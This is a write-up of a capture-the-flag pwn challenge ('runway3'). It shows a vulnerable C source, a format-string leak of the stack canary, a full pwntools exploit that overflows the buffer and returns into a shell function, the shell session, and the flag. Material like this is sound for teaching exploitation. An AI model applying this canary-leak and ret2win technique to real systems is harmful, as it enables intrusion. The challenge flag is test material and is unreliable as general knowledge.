# runway3 [120 solves]
### Challenge Description
> A new technique!

`nc challs.pwnoh.io 13403`
### Challenge Author 
> Author: kanderoo
# Challenge Files 
we are given with the source file that was used for compiling the binary.
```c filename=runway3.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/sendfile.h>

int win() {
    printf("You win! Here is your shell:\n");
    fflush(stdout);

    system("/bin/sh");
}

int echo(int amount) {
    char message[32];

    fgets(message, amount, stdin);

    printf(message);
    fflush(stdout);
}

int main() {
    printf("Is it just me, or is there an echo in here?\n");
    fflush(stdout);

    echo(31);
    echo(100);

    return 0;
}
```
# Solution
## Analysis
first analyse the binary provided to us.
```bash
fooker@fooker:~/buckeyectf2024/pwn/runway3$ file runway3
runway3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d6a1dc4dca86a6bbd13389e8b6613de00ae50e81, for GNU/Linux 3.2.0, not stripped
fooker@fooker:~/buckeyectf2024/pwn/runway3$ checksec runway3
[*] '~/buckeyectf2024/pwn/runway3/runway3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
the binary provided to us this time does have a canary protection. a quick glance at the source file hints us at `ret2win`. however, to perform a ret2win we must find a way to defeat the stack canary protection. 
## Format String Vulnerability
in teh `echo()` function, the source file allows to call `printf()` directly on a buffer that reads in the user-input. 
```c
char message[32];

fgets(message, amount, stdin);

printf(message);
```
this allows us to leverage an arbitrary read primitive. we could use this to read the stack canary. since the stack canaries are actually the copies of the master canary, therefore we know that the canary used in every other stackframe would be the same. the next call to `echo()` allows to write in `100 bytes` into the buffer which is significantly large to overflow the buffer and therefore we could craft a ROP chain.

## Leaking the Stack Canary 
i calculated the offset of the stack canary using `gdb`. then using the `%lx` format specifier, we could read the stack canary in a single payload. here's the full exploit

```py
from pwn import *

exe = './runway3'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)

host = 'challs.pwnoh.io'
port = 13403
r = remote(host, port, level='DEBUG')
# r = process(exe, level='DEBUG')

gs = '''
break *echo
continue
'''

## r = gdb.debug(exe, gdbscript=gs)

r.recvuntil(b'here?\n')

stack_payload = b'%13$lx'
r.sendline(stack_payload)
canary = int(r.recvline().strip().decode(), 16)

# printhex(ret_address))
payload = b'A' * 40 + p64(canary) + b'A' * 8 + p64(rop.ret[0]) + p64(elf.symbols['win'])

## print(payload)
## print(len(payload))

r.sendline(payload)

r.interactive()
```
when we run this binary, we do indeed get a shell.
```bash
fooker@fooker:~/buckeyectf2024/pwn/runway3$ python3 exploit.py
[*] '~/buckeyectf2024/pwn/runway3/runway3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 5 cached gadgets for './runway3'
[+] Opening connection to challs.pwnoh.io on port 13403: Done
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYou win! Here is your shell:
$ ls
flag.txt
run
$ cat flag.txt
bctf{wh0_kn3w_pr1nt1ng_w4s_s0_d4nG3R0Us_11aabc3287e74603}$
```
and we can just `cat` the flag
## Flag
`bctf{wh0_kn3w_pr1nt1ng_w4s_s0_d4nG3R0Us_11aabc3287e74603}`